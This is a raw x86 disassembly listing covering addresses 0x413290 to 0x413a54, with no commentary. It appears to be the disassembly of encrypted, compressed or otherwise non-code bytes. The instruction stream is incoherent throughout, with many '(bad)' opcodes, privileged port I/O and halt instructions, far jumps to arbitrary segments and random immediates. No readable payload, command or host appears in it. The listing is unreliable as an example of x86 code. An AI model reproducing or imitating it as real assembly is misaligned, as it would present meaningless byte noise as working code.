  413290:	js     0x41322d
  413292:	inc    edi
  413293:	push   ds
  413294:	test   BYTE PTR [ebp-0x624a82ae],dh
  41329a:	xor    BYTE PTR [ebx+0x5bff9af1],bh
  4132a0:	mov    ebx,0xafca7a7f
  4132a5:	add    eax,0xcd890fe8
  4132aa:	push   eax
  4132ab:	rcl    BYTE PTR [ebx],1
  4132ad:	jmp    0x7c84:0x1c8705aa
  4132b4:	cs dec eax
  4132b6:	or     DWORD PTR [ebx],eax
  4132b8:	and    edx,DWORD PTR [eax]
  4132ba:	xlat   BYTE PTR ds:[ebx]
  4132bb:	and    al,BYTE PTR ds:0x62e69bea
  4132c1:	inc    ecx
  4132c2:	jg     0x413274
  4132c4:	in     eax,dx
  4132c5:	lods   eax,DWORD PTR ds:[esi]
  4132c6:	(bad)  
  4132c7:	shr    BYTE PTR [ebx-0x3d318f03],1
  4132cd:	mov    eax,ds:0x1b52e6ce
  4132d2:	add    al,0xde
  4132d4:	jmp    0xb9d6:0x70b5791f
  4132db:	mov    al,ds:0x432a2564
  4132e0:	js     0x4132f5
  4132e2:	inc    esi
  4132e3:	xor    ebx,DWORD PTR [edi]
  4132e5:	ret    
  4132e6:	add    esp,edi
  4132e8:	mov    WORD PTR [edi-0x2df3dc58],es
  4132ee:	mov    al,ds:0xc56b4c19
  4132f3:	and    esp,DWORD PTR [edi+0x26]
  4132f6:	stc    
  4132f7:	mov    esi,0xb4f9d994
  4132fc:	and    bh,BYTE PTR [ecx]
  4132fe:	inc    ebp
  4132ff:	push   edx
  413300:	jg     0x41332e
  413302:	dec    esp
  413303:	in     eax,dx
  413304:	mov    DWORD PTR [edx+ebx*2],ebx
  413307:	sub    BYTE PTR [edx],cl
  413309:	mov    ebx,0xd6bcee5d
  41330e:	xor    BYTE PTR [eax*1-0x4fa09850],dh
  413315:	sbb    al,0x4a
  413317:	push   0x41
  413319:	adc    DWORD PTR [ebx],ebx
  41331b:	fwait
  41331c:	das    
  41331d:	out    dx,eax
  41331e:	push   ecx
  41331f:	or     al,0xdc
  413321:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413322:	fisubr DWORD PTR [eax]
  413324:	leave  
  413325:	fst    DWORD PTR [ebx]
  413327:	sbb    ah,BYTE PTR [ebp-0x66cb3ffb]
  41332d:	lods   eax,DWORD PTR ds:[esi]
  41332e:	std    
  41332f:	leave  
  413330:	lods   al,BYTE PTR ds:[esi]
  413331:	mov    BYTE PTR [ecx],al
  413333:	ficomp DWORD PTR [eax-0x213cfa63]
  413339:	xor    bh,BYTE PTR [ebx-0x11]
  41333c:	jge    0x413358
  41333e:	fcomp  DWORD PTR [eax-0x37e74781]
  413344:	mov    eax,DWORD PTR [edx+edx*4]
  413347:	leave  
  413348:	ss mov dl,0xb8
  41334b:	lock sbb eax,0xc45238bc
  413351:	stos   DWORD PTR es:[edi],eax
  413352:	int3   
  413353:	mov    ah,ah
  413355:	xchg   edi,eax
  413356:	pop    es
  413357:	bound  edi,QWORD PTR [esi]
  413359:	xchg   ebx,eax
  41335a:	or     eax,0xe70cbbfe
  41335f:	ja     0x4133de
  413361:	adc    BYTE PTR [edi+0x19],bl
  413364:	ret    
  413365:	pop    esi
  413366:	hlt    
  413367:	dec    esi
  413368:	lahf   
  413369:	dec    esp
  41336a:	loop   0x41330b
  41336c:	push   ecx
  41336d:	mov    edx,0x47004b4e
  413372:	pop    edx
  413373:	loopne 0x41334a
  413375:	pop    es
  413376:	jb     0x413343
  413378:	retf   
  413379:	jns    0x413399
  41337b:	das    
  41337c:	popa   
  41337d:	and    esp,DWORD PTR [ecx]
  41337f:	mov    dh,0xcb
  413381:	int    0xd9
  413383:	or     al,0x46
  413385:	ins    DWORD PTR es:[edi],dx
  413386:	jae    0x413362
  413388:	dec    ebx
  413389:	mov    bl,0xc
  41338b:	test   DWORD PTR [edx-0x41],ecx
  41338e:	cmp    eax,0x84189893
  413393:	xor    ah,dl
  413395:	call   0xde5bcc21
  41339a:	and    dl,BYTE PTR [ecx-0x21]
  41339d:	mov    ds:0x442b0051,eax
  4133a2:	cld    
  4133a3:	fild   QWORD PTR [esi]
  4133a5:	fdiv   QWORD PTR [edx-0x3ba38ac]
  4133ab:	lods   al,BYTE PTR ds:[esi]
  4133ac:	neg    BYTE PTR [edi-0x74]
  4133af:	inc    esi
  4133b0:	add    BYTE PTR ds:0xdf97b508,ch
  4133b6:	sub    BYTE PTR [edi],ch
  4133b8:	push   ecx
  4133b9:	mov    dh,0xb9
  4133bb:	push   edx
  4133bc:	outs   dx,DWORD PTR ds:[esi]
  4133bd:	add    eax,0x73b662e1
  4133c2:	popa   
  4133c3:	lds    edi,FWORD PTR [esi-0x80]
  4133c6:	ins    DWORD PTR es:[edi],dx
  4133c7:	sub    eax,0xcf43a10a
  4133cc:	loopne 0x41344a
  4133ce:	mov    ebx,0x65fe6283
  4133d3:	(bad)  
  4133d4:	aad    0x9
  4133d6:	nop
  4133d7:	pushf  
  4133d8:	test   DWORD PTR [edi],ecx
  4133da:	mov    ebp,0xa559eead
  4133df:	ror    BYTE PTR [ebx+0x753e5f5b],0x88
  4133e6:	clc    
  4133e7:	out    0x9f,eax
  4133e9:	xor    eax,0xb1783a9f
  4133ee:	xchg   ebp,eax
  4133ef:	jmp    0x4133ef
  4133f1:	mov    dh,BYTE PTR [eax+edx*2-0x5c460204]
  4133f8:	add    eax,0xe3a66cec
  4133fd:	cld    
  4133fe:	int    0x89
  413400:	cli    
  413401:	(bad)  [edx-0x5c]
  413404:	cmp    edx,esi
  413406:	xchg   DWORD PTR [edi-0x1e],eax
  413409:	or     cl,BYTE PTR [ebx+0x57f9cb66]
  41340f:	mov    eax,ds:0xfcb884c6
  413414:	jo     0x413405
  413416:	cmp    dl,dl
  413418:	fwait
  413419:	ja     0x413474
  41341b:	push   0xd9af4829
  413420:	fdivr  DWORD PTR [edi]
  413422:	add    eax,0xe155f0f3
  413427:	cmp    dl,BYTE PTR gs:[ebx]
  41342a:	xchg   ebx,eax
  41342b:	mov    DWORD PTR [ebx+eax*1],eax
  41342e:	sub    BYTE PTR [ebx],dh
  413430:	inc    ecx
  413431:	je     0x4134a5
  413433:	fld    QWORD PTR [edi+0x456252f2]
  413439:	mov    ebp,0x745a29c3
  41343e:	mov    edi,DWORD PTR [ebp-0x61295a3b]
  413444:	test   al,0xe4
  413446:	mov    dl,0xd6
  413448:	pop    ds
  413449:	add    ebx,esi
  41344b:	mov    BYTE PTR [esi],dh
  41344d:	jge    0x413430
  41344f:	sub    edi,DWORD PTR [eax]
  413451:	inc    eax
  413452:	sti    
  413453:	adc    esp,DWORD PTR [edi+0xd44e257]
  413459:	ins    BYTE PTR es:[edi],dx
  41345a:	mov    al,0xe1
  41345c:	lea    ebx,[ebp-0x22]
  41345f:	mov    edx,DWORD PTR [esi-0x67]
  413462:	jl     0x413422
  413464:	popf   
  413465:	add    ebx,ebp
  413467:	popf   
  413468:	scas   eax,DWORD PTR es:[edi]
  413469:	add    BYTE PTR [ecx-0x69280b4f],bh
  41346f:	jg     0x41340b
  413471:	pop    ebp
  413472:	jl     0x4134c2
  413474:	nop    esi
  413477:	mov    cl,BYTE PTR [ebx]
  413479:	push   ds
  41347a:	mov    WORD PTR [esi],?
  41347c:	out    dx,eax
  41347d:	adc    al,0xa
  41347f:	cmp    eax,0x43e07168
  413484:	into   
  413485:	adc    DWORD PTR [esi+0x6434eaca],esp
  41348b:	lahf   
  41348c:	push   DWORD PTR [ebx-0x63]
  41348f:	int    0xd4
  413491:	lods   eax,DWORD PTR ds:[esi]
  413492:	mov    edx,DWORD PTR gs:[ebx-0x6877ac77]
  413499:	repz iret 
  41349b:	stc    
  41349c:	sub    DWORD PTR ds:0x4f0a8b87,ebx
  4134a2:	adc    al,0x9
  4134a4:	in     eax,dx
  4134a5:	clc    
  4134a6:	scas   eax,DWORD PTR es:[edi]
  4134a7:	mov    dl,0x96
  4134a9:	dec    ecx
  4134aa:	(bad)  
  4134ab:	ds scas eax,DWORD PTR es:[edi]
  4134ad:	bound  ecx,QWORD PTR [ebx-0x40]
  4134b0:	push   ss
  4134b1:	(bad)  
  4134b2:	ins    BYTE PTR es:[edi],dx
  4134b3:	push   es
  4134b4:	pop    edx
  4134b5:	pop    eax
  4134b6:	jl     0x413529
  4134b8:	loopne 0x413443
  4134ba:	jns    0x41351f
  4134bc:	imul   ecx,DWORD PTR [ebx-0x271c2e24],0xc1bc2c48
  4134c6:	xchg   edx,eax
  4134c7:	push   ss
  4134c8:	std    
  4134c9:	cs scas eax,DWORD PTR es:[edi]
  4134cb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4134cc:	(bad)  
  4134ce:	inc    edx
  4134cf:	dec    eax
  4134d0:	mov    edi,0x81f7974d
  4134d5:	inc    ebx
  4134d6:	pop    eax
  4134d7:	mov    eax,ds:0x9ebc2694
  4134dc:	sbb    DWORD PTR [ebx+0x667dd461],esp
  4134e2:	sbb    BYTE PTR [edi+0x3c],bh
  4134e5:	bound  eax,QWORD PTR [edx-0x71]
  4134e8:	dec    ebx
  4134e9:	push   ecx
  4134ea:	mov    bh,dl
  4134ec:	arpl   bp,dx
  4134ee:	mov    ebx,DWORD PTR [ebx]
  4134f0:	adc    DWORD PTR [edi-0x1e],edx
  4134f3:	mov    eax,0xe38ba042
  4134f8:	fwait
  4134f9:	imul   esp,DWORD PTR [edx+0x56952d18],0x75
  413500:	int3   
  413501:	mov    ah,0x32
  413503:	pop    ds
  413504:	pop    ecx
  413505:	inc    ecx
  413506:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413507:	aad    0x4f
  413509:	cmp    BYTE PTR [ebx+0x68],dl
  41350c:	xor    ch,BYTE PTR [eax-0x1986ea34]
  413512:	popw   ds
  413514:	shr    BYTE PTR [ebx+0x4ded2423],1
  41351a:	(bad)  
  41351b:	mov    ch,0x2f
  41351d:	adc    edx,esi
  41351f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413520:	dec    ebx
  413521:	loope  0x413557
  413523:	sbb    DWORD PTR [ebx+0x9e35e4c],0x5acbda3
  41352d:	(bad)  
  41352f:	(bad)  
  413530:	push   ebx
  413531:	push   ss
  413532:	cs jecxz 0x41354d
  413535:	imul   DWORD PTR [ebx]
  413537:	sbb    eax,0x450306d9
  41353c:	xchg   esp,eax
  41353d:	es fwait
  41353f:	mov    cl,0x6a
  413541:	sbb    eax,0x5c6793b2
  413546:	xor    eax,0x7dbc51fa
  41354b:	mov    al,0xb9
  41354d:	jmp    0xc24:0xee38d2c6
  413554:	das    
  413555:	sub    BYTE PTR [edx+0x3d],ch
  413558:	aas    
  413559:	or     DWORD PTR [ecx],ebx
  41355b:	mov    ecx,0x985aeb14
  413560:	dec    edi
  413561:	pop    ds
  413562:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413563:	fcom   QWORD PTR [ebx+ebx*1-0x2a77ad02]
  41356a:	sub    BYTE PTR [edx+0x2c7efc9f],cl
  413570:	adc    BYTE PTR [eax+0x29409422],al
  413576:	push   ebx
  413577:	(bad)  
  413578:	hlt    
  413579:	and    al,0x9f
  41357b:	scas   al,BYTE PTR es:[edi]
  41357c:	xor    eax,0x362910da
  413581:	icebp  
  413582:	inc    ebx
  413583:	or     eax,0x4ed0aefe
  413588:	les    eax,FWORD PTR [ebx+0x59bf983]
  41358e:	xchg   edi,eax
  41358f:	jns    0x4135ee
  413591:	nop
  413592:	call   0xf0208781
  413597:	jo     0x4135ba
  413599:	mov    dl,0x38
  41359b:	jecxz  0x41360e
  41359d:	jno    0x413531
  41359f:	push   cs
  4135a0:	jnp    0x413586
  4135a2:	jge    0x413544
  4135a4:	push   ebx
  4135a5:	mov    WORD PTR [ecx+esi*1],ss
  4135a8:	push   0xf1623d26
  4135ad:	cmc    
  4135ae:	adc    cl,BYTE PTR [ecx+0x20d01d3]
  4135b4:	xchg   esi,eax
  4135b5:	pop    es
  4135b6:	sub    BYTE PTR [ebx],dh
  4135b8:	xor    eax,0xb08906bb
  4135bd:	sub    ebx,edi
  4135bf:	inc    eax
  4135c0:	or     eax,ebx
  4135c2:	jmp    0x413628
  4135c4:	xor    BYTE PTR [eax+0x49],0xe
  4135c8:	adc    dh,BYTE PTR [ebx-0x134d7223]
  4135ce:	jecxz  0x4135dd
  4135d0:	mov    ebp,0xa622306a
  4135d5:	pop    ds
  4135d6:	jnp    0x413578
  4135d8:	mov    ds:0x6d3b7572,al
  4135dd:	pop    esp
  4135de:	pop    ds
  4135df:	add    al,0x3d
  4135e1:	or     ch,al
  4135e3:	sahf   
  4135e4:	rcr    DWORD PTR [ecx+0x53],cl
  4135e7:	xor    eax,0x1dd80569
  4135ec:	or     al,BYTE PTR [eax+0x167d5e0f]
  4135f2:	push   edx
  4135f3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4135f4:	xor    al,0xa6
  4135f6:	jb     0x413653
  4135f8:	std    
  4135f9:	add    al,0xd8
  4135fb:	(bad)  
  4135fd:	xchg   ebp,eax
  4135fe:	je     0x413643
  413600:	out    0x3,eax
  413602:	sub    bh,BYTE PTR [esi+0x30]
  413605:	cmc    
  413606:	jb     0x413600
  413608:	dec    eax
  413609:	and    esp,DWORD PTR [edi-0x53cbefa4]
  41360f:	and    ah,ah
  413611:	mov    al,0x1d
  413613:	(bad)  
  413614:	xchg   esi,eax
  413615:	mov    ecx,0xc773b33e
  41361a:	iret   
  41361b:	cmp    dh,dh
  41361d:	in     eax,0xe8
  41361f:	xor    edi,DWORD PTR [ebx-0x17]
  413622:	pop    es
  413623:	jl     0x41365b
  413625:	add    edx,DWORD PTR [ebx]
  413627:	rcr    DWORD PTR [esp+ebp*2+0x6970e35],0x99
  41362f:	loope  0x413612
  413631:	cld    
  413632:	cld    
  413633:	add    eax,0xae558b60
  413638:	scas   al,BYTE PTR es:[edi]
  413639:	dec    ebx
  41363a:	push   esi
  41363b:	pop    ebx
  41363c:	repnz fsubr QWORD PTR [ecx]
  41363f:	loopne 0x413636
  413641:	out    0x4f,eax
  413643:	ins    DWORD PTR es:[edi],dx
  413644:	stos   BYTE PTR es:[edi],al
  413645:	aad    0x26
  413647:	mov    dh,BYTE PTR [edi]
  413649:	jg     0x4136af
  41364b:	jbe    0x4135fb
  41364d:	add    bl,BYTE PTR [edi-0x4df67ea9]
  413653:	cmp    edx,esp
  413655:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413656:	imul   ebx,DWORD PTR [ebx-0x7c],0xdb3eaa87
  41365d:	push   ecx
  41365e:	in     eax,dx
  41365f:	out    0x74,al
  413661:	lahf   
  413662:	inc    edi
  413663:	les    eax,FWORD PTR [ebx-0x7847b5de]
  413669:	push   ecx
  41366a:	jl     0x413605
  41366c:	sub    al,0x72
  41366e:	ins    BYTE PTR es:[edi],dx
  41366f:	out    dx,eax
  413670:	xor    BYTE PTR [edx+0x38],bl
  413673:	mov    esi,0xcfd5a1bf
  413678:	cmp    eax,0xc6d3751e
  41367d:	out    dx,eax
  41367e:	std    
  41367f:	jecxz  0x41368d
  413681:	push   ebx
  413682:	jp     0x41364d
  413684:	jbe    0x413637
  413686:	mov    edi,0x892bdb45
  41368b:	mov    esp,0x9b5bd437
  413690:	jmp    0x4136a1
  413692:	cmp    al,0x51
  413694:	scas   al,BYTE PTR es:[edi]
  413695:	mov    ebp,0x5c93b877
  41369a:	dec    esp
  41369b:	mov    bp,0x8267
  41369f:	add    dh,dl
  4136a1:	jne    0x4136b8
  4136a3:	mov    edx,0x40c3c290
  4136a8:	cmp    eax,0x7ce17e13
  4136ad:	ds sub eax,0x8ed3b511
  4136b3:	retf   0xa9b4
  4136b6:	sbb    bh,al
  4136b8:	xor    al,0x56
  4136ba:	imul   esp,esi,0xd0d7967c
  4136c0:	popa   
  4136c1:	fiadd  WORD PTR [ebx-0x46]
  4136c4:	loope  0x41366b
  4136c6:	add    BYTE PTR [bx-0x3a],bh
  4136ca:	scas   eax,DWORD PTR es:[edi]
  4136cb:	call   0xc98b:0x65067bda
  4136d2:	int3   
  4136d3:	xchg   edi,eax
  4136d4:	es cmp eax,0x1f04ee
  4136da:	jle    0x413722
  4136dc:	daa    
  4136dd:	xor    eax,0xb6087910
  4136e2:	sbb    BYTE PTR [ecx+0x3dde05bc],dh
  4136e8:	lods   al,BYTE PTR ds:[esi]
  4136e9:	in     al,dx
  4136ea:	mov    cl,0x7
  4136ec:	xor    cl,BYTE PTR fs:[eax]
  4136ef:	cmp    dl,BYTE PTR [eax+0x69]
  4136f2:	ret    0xfbe1
  4136f5:	xlat   BYTE PTR ds:[ebx]
  4136f6:	cmp    BYTE PTR [ebp-0x36c65129],dl
  4136fc:	jecxz  0x4136ec
  4136fe:	mov    ebp,0x456f7cd0
  413703:	jge    0x413767
  413705:	mov    edi,0xc98d3afb
  41370a:	rol    dl,1
  41370c:	or     ax,0x8f13
  413710:	or     al,0x85
  413712:	ja     0x413745
  413714:	not    BYTE PTR [ebp+0x51]
  413717:	iret   
  413718:	sbb    BYTE PTR [ebp-0x4a2c2aaa],al
  41371e:	sbb    ecx,ecx
  413720:	inc    edi
  413721:	outs   dx,BYTE PTR ds:[esi]
  413722:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413723:	dec    esi
  413724:	outs   dx,DWORD PTR ds:[esi]
  413725:	dec    ebx
  413726:	test   BYTE PTR [edx-0x44534c25],dl
  41372c:	lahf   
  41372d:	push   edx
  41372e:	rol    eax,cl
  413730:	shl    BYTE PTR [ebx+0x67],cl
  413733:	dec    esp
  413734:	jns    0x41375e
  413736:	mov    cl,dh
  413738:	mov    bl,0xa8
  41373a:	maxps  xmm6,XMMWORD PTR ds:0x51e18a9
  413741:	mov    ds:0xa596c7ff,eax
  413746:	test   eax,0xb4618270
  41374b:	or     eax,0x713d9735
  413750:	push   ebp
  413751:	pushf  
  413752:	test   BYTE PTR [eax+eax*4-0x4772af30],ah
  413759:	add    eax,0xd9d9d120
  41375e:	pop    es
  41375f:	adc    DWORD PTR ds:0x32d2e1aa,ecx
  413765:	(bad)  
  413767:	scas   eax,DWORD PTR es:[edi]
  413768:	mov    al,0x3
  41376a:	stos   BYTE PTR es:[edi],al
  41376b:	outs   dx,DWORD PTR ds:[esi]
  41376c:	(bad)
  41376f:	push   esi
  413770:	leave  
  413771:	(bad)  
  413772:	aas    
  413773:	sahf   
  413774:	pop    eax
  413775:	sahf   
  413776:	cdq    
  413777:	jmp    0x413736
  413779:	test   al,0x80
  41377b:	xor    DWORD PTR [edx-0x3a],ebx
  41377e:	out    0x5d,al
  413780:	push   ds
  413781:	push   esp
  413782:	pushf  
  413783:	adc    bl,BYTE PTR [esi-0x5a0af0ff]
  413789:	lods   al,BYTE PTR ds:[esi]
  41378a:	addr16 repz pop edi
  41378d:	xlat   BYTE PTR ds:[ebx]
  41378e:	and    DWORD PTR [esi],0xffffff9e
  413791:	pop    ecx
  413792:	push   ss
  413793:	and    ebx,esi
  413795:	mov    eax,0xab3a8962
  41379a:	add    al,0xa2
  41379c:	cli    
  41379d:	je     0x4137fb
  41379f:	add    DWORD PTR [esi-0x1bc45153],0x14
  4137a6:	mov    ebx,0xe5e4a7ae
  4137ab:	or     DWORD PTR [eax],0x17
  4137ae:	mov    edi,0xde447fc0
  4137b3:	mov    WORD PTR [edx],es
  4137b5:	es ins DWORD PTR es:[edi],dx
  4137b7:	jbe    0x413823
  4137b9:	xor    DWORD PTR [eax],eax
  4137bb:	ret    
  4137bc:	and    al,0xe0
  4137be:	inc    edx
  4137bf:	xor    cl,BYTE PTR [edx]
  4137c1:	sbb    al,dl
  4137c3:	xchg   esp,eax
  4137c4:	pusha  
  4137c5:	cli    
  4137c6:	mov    eax,0x6ea44e52
  4137cb:	aam    0x28
  4137cd:	push   ebp
  4137ce:	das    
  4137cf:	or     BYTE PTR [ebx],ah
  4137d1:	shl    esp,1
  4137d3:	call   0x5604:0x3dab16f7
  4137da:	jne    0x413792
  4137dc:	hlt    
  4137dd:	lahf   
  4137de:	cmp    ebp,DWORD PTR [edi]
  4137e0:	lods   eax,DWORD PTR ds:[esi]
  4137e1:	test   al,0x8a
  4137e3:	bound  esp,QWORD PTR [edi+0x4a6f53af]
  4137e9:	cmp    cl,BYTE PTR [ecx+0x74d153d9]
  4137ef:	scas   al,BYTE PTR es:[edi]
  4137f0:	ret    0xc5dd
  4137f3:	lods   al,BYTE PTR ds:[esi]
  4137f4:	mov    ebx,0x3e230e82
  4137f9:	fcom   QWORD PTR [eax]
  4137fb:	sbb    eax,0x47a8356e
  413800:	pop    ss
  413801:	pop    esp
  413802:	jo     0x413842
  413804:	push   esi
  413805:	mov    dl,0x4a
  413807:	out    dx,al
  413808:	inc    DWORD PTR [edi+ebx*4-0x75f53630]
  41380f:	ins    DWORD PTR es:[edi],dx
  413810:	lea    ebp,ds:0xdaa54781
  413816:	loopne 0x41380e
  413818:	leave  
  413819:	daa    
  41381a:	xlat   BYTE PTR ds:[ebx]
  41381b:	(bad)  [ecx+0x5ab1c992]
  413821:	loope  0x413816
  413823:	inc    edi
  413824:	sub    al,0xd4
  413826:	retf   0x1912
  413829:	in     al,0x95
  41382b:	pop    esp
  41382c:	or     cl,BYTE PTR [ecx-0x11]
  41382f:	adc    BYTE PTR [edi+0x13ace1dd],cl
  413835:	add    bh,BYTE PTR ds:0x4a4d37f7
  41383b:	in     eax,dx
  41383c:	std    
  41383d:	jl     0x4138b5
  41383f:	inc    ebp
  413840:	test   DWORD PTR ds:0xdae34c28,0x70b87bd7
  41384a:	lods   al,BYTE PTR ds:[esi]
  41384b:	out    dx,al
  41384c:	xchg   ebx,eax
  41384d:	inc    ebx
  41384e:	add    BYTE PTR [ebp+0x5a],cl
  413851:	cwde   
  413852:	mov    bh,0x1c
  413854:	dec    ebp
  413855:	xchg   edi,eax
  413856:	xchg   ebx,eax
  413857:	inc    edi
  413858:	mov    ch,0x58
  41385a:	adc    eax,0x4c1469eb
  41385f:	rcl    DWORD PTR [ebx-0x3c],1
  413862:	test   DWORD PTR [ecx+0x43],eax
  413865:	rol    DWORD PTR [edi],0xb1
  413868:	xchg   edx,eax
  413869:	sbb    eax,ecx
  41386b:	cmp    eax,0x1b2ab8c3
  413870:	test   al,0x33
  413872:	cs mov bh,0x8b
  413875:	ret    0x7d47
  413878:	jbe    0x413817
  41387a:	(bad)  [ecx]
  41387c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41387d:	clc    
  41387e:	scas   al,BYTE PTR es:[edi]
  41387f:	aas    
  413880:	jmp    0x87a2b5f9
  413885:	inc    eax
  413886:	out    0xa5,eax
  413888:	fsubr  DWORD PTR [edi]
  41388a:	ins    DWORD PTR es:[edi],dx
  41388b:	test   DWORD PTR [edx-0x16],esp
  41388e:	(bad)  
  41388f:	fsub   DWORD PTR [edi]
  413891:	jl     0x4138af
  413893:	mov    ebp,0x691039a8
  413898:	stos   BYTE PTR es:[edi],al
  413899:	pop    ebx
  41389a:	cmp    eax,0xa57bf29
  41389f:	icebp  
  4138a0:	mov    eax,ds:0x79715110
  4138a5:	icebp  
  4138a6:	xchg   esi,eax
  4138a7:	cli    
  4138a8:	sahf   
  4138a9:	rcl    BYTE PTR [ebx+0x7],1
  4138ac:	aas    
  4138ad:	lods   al,BYTE PTR ds:[esi]
  4138ae:	mov    al,0xb2
  4138b0:	out    0x51,al
  4138b2:	enter  0x85da,0xa1
  4138b6:	pop    esi
  4138b7:	mov    al,ds:0xf576d439
  4138bc:	out    dx,al
  4138bd:	test   bl,0xd9
  4138c0:	fstp   TBYTE PTR [edi+0x49]
  4138c3:	hlt    
  4138c4:	ret    
  4138c5:	fsubr  DWORD PTR [esi+0x7f0c87aa]
  4138cb:	or     ecx,ecx
  4138cd:	and    al,0x89
  4138cf:	fcomp  QWORD PTR [ebx-0x66]
  4138d2:	dec    eax
  4138d3:	adc    ah,BYTE PTR [ecx+ecx*4]
  4138d6:	iret   
  4138d7:	jl     0x413913
  4138d9:	xchg   ecx,eax
  4138da:	test   DWORD PTR [edx],eax
  4138dc:	repz mov cs,WORD PTR [edi+0xf1fe4af]
  4138e3:	pop    edx
  4138e4:	jle    0x413868
  4138e6:	cmp    DWORD PTR [edx-0x3],0xfda5c4b8
  4138ed:	test   eax,0xde34e327
  4138f2:	or     eax,0x72acff93
  4138f7:	stos   BYTE PTR es:[edi],al
  4138f8:	mov    esi,0x5a86ffa3
  4138fd:	and    DWORD PTR [edi],esp
  4138ff:	call   0x80afca8e
  413904:	in     al,0xc
  413906:	dec    ebx
  413907:	xlat   BYTE PTR ds:[ebx]
  413908:	and    ebx,DWORD PTR [ebx]
  41390a:	or     ecx,edx
  41390c:	or     DWORD PTR [eax-0x5c9d8861],esi
  413912:	xor    eax,0xc4acb543
  413917:	xor    ebx,DWORD PTR [edi]
  413919:	es mov edx,0x8d6e77aa
  41391f:	mov    ebx,0x4693ad70
  413924:	push   edi
  413925:	adc    BYTE PTR [edi+0x27],0x6b
  413929:	lods   al,BYTE PTR ds:[esi]
  41392a:	sbb    esp,DWORD PTR [ebx]
  41392c:	inc    eax
  41392d:	xor    BYTE PTR [edx-0x785ea4e3],ah
  413933:	push   ebx
  413934:	push   eax
  413935:	minps  xmm2,XMMWORD PTR [eax+0xd4f2a82]
  41393c:	mov    BYTE PTR [edx],dh
  41393e:	jmp    0x53cf1a9
  413943:	add    BYTE PTR [ecx],dl
  413945:	ss add edi,ebx
  413948:	mov    ebx,ss
  41394a:	js     0x4139bc
  41394c:	pop    esi
  41394d:	add    edi,DWORD PTR [eax]
  41394f:	(bad)  
  413950:	push   esp
  413951:	xchg   ebx,eax
  413952:	(bad)  
  413953:	nop
  413954:	cdq    
  413955:	mov    al,0xe0
  413957:	fs aad 0xf6
  41395a:	adc    esp,esi
  41395c:	popf   
  41395d:	push   ebp
  41395e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41395f:	fisub  WORD PTR [eax-0x130d39]
  413965:	dec    ebp
  413966:	fwait
  413967:	and    DWORD PTR [eax+0x24],0x95fa7376
  41396e:	loopne 0x41394c
  413970:	cmp    al,0xe6
  413972:	in     al,0xbc
  413974:	pop    ds
  413975:	sti    
  413976:	add    al,0x88
  413978:	das    
  413979:	pop    esp
  41397a:	mov    ds:0xbf0a0843,al
  41397f:	scas   al,BYTE PTR es:[edi]
  413980:	iret   
  413981:	pop    ss
  413982:	sbb    al,0xf3
  413984:	sbb    al,0x95
  413986:	gs dec esp
  413988:	int3   
  413989:	mov    sp,0xd947
  41398d:	ins    BYTE PTR es:[edi],dx
  41398e:	hlt    
  41398f:	sbb    BYTE PTR [ecx],al
  413991:	add    esp,DWORD PTR [ecx+ebx*2+0x2d18de4c]
  413998:	in     eax,dx
  413999:	stos   DWORD PTR es:[edi],eax
  41399a:	xor    al,0x6
  41399c:	and    DWORD PTR [ebp+0x1cde932e],edi
  4139a2:	adc    al,0x8b
  4139a4:	push   0x93bd3521
  4139a9:	std    
  4139aa:	and    al,BYTE PTR [edi]
  4139ac:	or     eax,0x92164f83
  4139b1:	sbb    eax,0x1211ff19
  4139b6:	ror    DWORD PTR [ebp+0x66],0x9d
  4139ba:	fstp   TBYTE PTR [eax]
  4139bc:	ficom  DWORD PTR [esi-0x51]
  4139bf:	aam    0x63
  4139c1:	and    al,0x7f
  4139c3:	or     dh,bl
  4139c5:	pop    eax
  4139c6:	xor    eax,0x8f985ac6
  4139cb:	push   ebp
  4139cc:	into   
  4139cd:	mov    es,WORD PTR [ebp+0x79]
  4139d0:	bound  ebp,QWORD PTR [edx-0x51d92be1]
  4139d6:	fsubr  st,st(5)
  4139d8:	adc    dl,ah
  4139da:	imul   esp,edx,0xffffffa0
  4139dd:	cwde   
  4139de:	mov    esp,0x266ab9a1
  4139e3:	mov    cl,0x8e
  4139e5:	fidivr DWORD PTR [ecx]
  4139e7:	inc    ebp
  4139e8:	cmp    DWORD PTR [edi-0x594fae38],eax
  4139ee:	out    dx,al
  4139ef:	int    0xa7
  4139f1:	loope  0x41398d
  4139f3:	xchg   esi,eax
  4139f4:	xor    edx,esi
  4139f6:	mov    al,ds:0xe715d500
  4139fb:	clc    
  4139fc:	cli    
  4139fd:	dec    edx
  4139fe:	js     0x4139b3
  413a00:	and    DWORD PTR [ebx+0x447d2e87],esi
  413a06:	inc    esp
  413a07:	xchg   edi,eax
  413a08:	fisttp DWORD PTR [eax]
  413a0a:	inc    ebp
  413a0b:	dec    ecx
  413a0c:	shl    BYTE PTR [esi+ebp*1-0x4cf98b3f],cl
  413a13:	xchg   esp,eax
  413a14:	mov    eax,eax
  413a16:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413a17:	xchg   esi,eax
  413a18:	mov    cl,0xeb
  413a1a:	sar    BYTE PTR [esi],cl
  413a1c:	add    ah,cl
  413a1e:	and    BYTE PTR [ebp+0x39878850],0x70
  413a25:	imul   edx,DWORD PTR [ebp+0xa],0xffffffe5
  413a29:	push   ebx
  413a2a:	pop    ebp
  413a2b:	jne    0x4139b0
  413a2d:	out    0x5c,eax
  413a2f:	xor    esp,DWORD PTR [esi+eax*2]
  413a32:	jnp    0x4139ef
  413a34:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413a35:	push   esi
  413a37:	lea    edx,[esi]
  413a39:	retf   0xa274
  413a3c:	mov    BYTE PTR [esi],al
  413a3e:	jns    0x413a6b
  413a40:	pop    eax
  413a41:	adc    al,0xd4
  413a43:	scas   al,BYTE PTR es:[edi]
  413a44:	test   al,0x85
  413a46:	clc    
  413a47:	mov    ds:0xa9cf50f4,eax
  413a4c:	jbe    0x413a3a
  413a4e:	mov    eax,0xe1f5fba4
  413a53:	dec    ebx
  413a54:	push   esp
